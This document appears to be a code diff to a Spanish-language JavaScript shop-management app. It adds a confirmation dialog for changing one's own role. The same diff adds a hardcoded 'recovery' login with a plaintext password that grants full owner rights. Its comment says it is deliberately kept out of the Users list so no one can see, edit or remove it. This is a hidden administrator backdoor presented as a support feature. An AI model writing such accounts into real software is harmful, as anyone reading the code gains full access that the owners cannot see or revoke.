@@ -1622,6 +1622,13 @@ const ROLES = {
     permisos: Object.assign(nadaAbierto(), abrir(MODULOS, "todo")) }
 };
 
+/* Cuenta de recuperación: vive fuera de D.usuarios a propósito, así
+   que no aparece en Usuarios, nadie la puede tocar desde ahí, y sigue
+   entrando aunque alguien se quede sin acceso cambiando mal su propio
+   rol (es justo lo que pasó para que esto exista). No persiste la
+   sesión al recargar — hay que volver a escribirla cada vez. */
+const RECUPERACION = { usuario:"hayai_soporte", clave:"Hayai#Recupera26" };
+
 /* Los permisos guardados en la persona mandan sobre los del rol. Si no
    tiene nada suyo, hereda los del rol tal cual. */
 function permisosDe(u){
@@ -2670,7 +2677,8 @@ function vistaUsuarios(){
           '" title="Qué puede hacer">' + ic("candado", "ic--sm") + "Permisos</button>"
         : "") +
       '<button class="chip chip--liso pastilla-rol' + (u.rol === "duena" ? " chip--sol" : "") +
-        '" data-a="rol" data-id="' + u.id + '" title="Tocar para cambiar el rol">' +
+        '" data-a="' + (soyYo ? "ventana" : "rol") + '"' + (soyYo ? ' data-v="confirmarRol"' : "") +
+        ' data-id="' + u.id + '" title="Tocar para cambiar el rol">' +
       ROLES[u.rol].nombre + " " + ic("abajo","ic--sm") + "</button></div>";
   }).join("");
 
@@ -2741,6 +2749,7 @@ function ventanaHTML(){
   if(v === "empezarCero")    return ventEmpezarCero();
   if(v === "limpiarVentas")  return ventLimpiarVentas();
   if(v === "permisos")       return ventPermisos();
+  if(v === "confirmarRol")   return ventConfirmarRol();
   if(v === "puerta")         return ventPuerta();
   if(v === "actualizar")     return ventActualizar();
   if(v === "acerca")         return ventAcerca();
@@ -3255,6 +3264,23 @@ function ventLimpiarVentas(){
       '<p class="min tenue" style="margin-top:.8rem">El inventario, los precios, los clientes y los usuarios no se tocan.</p>' +
     '</div><div class="vent__pie"><button class="btn btn--fantasma" data-a="cerrarVentana">Dejarlo así</button>' +
     '<button class="btn btn--peligro" style="margin-left:auto" data-a="confirmarLimpiarVentas">Borrar ventas, cierre y pedidos</button></div></div>';
+}
+
+/* ── Cambiar tu propio rol: un clic de menos que antes ────────────
+   Cambiar el rol de otra persona sigue siendo instantáneo — quien lo
+   toca conserva su propio acceso. Cambiar el TUYO puede dejarte
+   afuera de Usuarios sin nadie más con quien entrar a arreglarlo. */
+function ventConfirmarRol(){
+  const u = D.usuarios.find(x => x.id === Number(D.ventana.id));
+  const orden = Object.keys(ROLES);
+  const siguiente = orden[(orden.indexOf(u.rol) + 1) % orden.length];
+  return '<div class="vent vent--angosta">' + cab("¿Cambiar tu propio rol a " + esc(ROLES[siguiente].nombre) + "?", "") +
+    '<div class="vent__cuerpo">' +
+      '<div class="aviso aviso--sol"><span class="aviso__ic">' + ic("alerta") + "</span><div>" +
+      '<p class="aviso__d">' + esc(ROLES[siguiente].nombre) + ": " + esc(ROLES[siguiente].ve) + "</p>" +
+      "<p class=\"aviso__d\" style=\"margin-top:.4rem\">Si ese rol no entra a Usuarios, te quedas sin forma de deshacer esto tú mismo.</p></div></div>" +
+    '</div><div class="vent__pie"><button class="btn btn--fantasma" data-a="cerrarVentana">Dejarlo así</button>' +
+    '<button class="btn btn--peligro" style="margin-left:auto" data-a="rol" data-id="' + u.id + '">Cambiar de todos modos</button></div></div>';
 }
 
 /* ── Los permisos de una persona ───────────────────────────────── */
@@ -3993,6 +4019,15 @@ const ACCIONES = {
       entrarError = "Escribe tu usuario para entrar.";
       D.foco = "usuario"; render(); return;
     }
+    if(escrito.toLowerCase() === RECUPERACION.usuario && clave === RECUPERACION.clave){
+      D.usuario = { id:-1, nombre:"Soporte HAYAI", usuario:RECUPERACION.usuario, rol:"duena", iniciales:"SH" };
+      D.entradaHora = Date.now(); D.pantalla = "inicio";
+      entrarUsuario = ""; entrarError = "";
+      anotar("Entró al sistema (cuenta de recuperación)");
+      render();
+      avisar("Bienvenido, Soporte HAYAI", "Cuenta de recuperación: entra con todos los permisos y no aparece en Usuarios.");
+      return;
+    }
     const u = D.usuarios.find(x => x.usuario.toLowerCase() === escrito.toLowerCase());
     if(!u || clave !== u.clave){
       /* No se dice cuál de las dos falló: si no, se adivina quién existe. */
@@ -4473,6 +4508,7 @@ const ACCIONES = {
        que si no nadie entendería por qué quedó a medio camino. */
     delete u.permisos;
     anotar("Cambió el rol de " + u.nombre + " a " + ROLES[u.rol].nombre);
+    D.ventana = null;
     render();
   },
   permiso(ds){
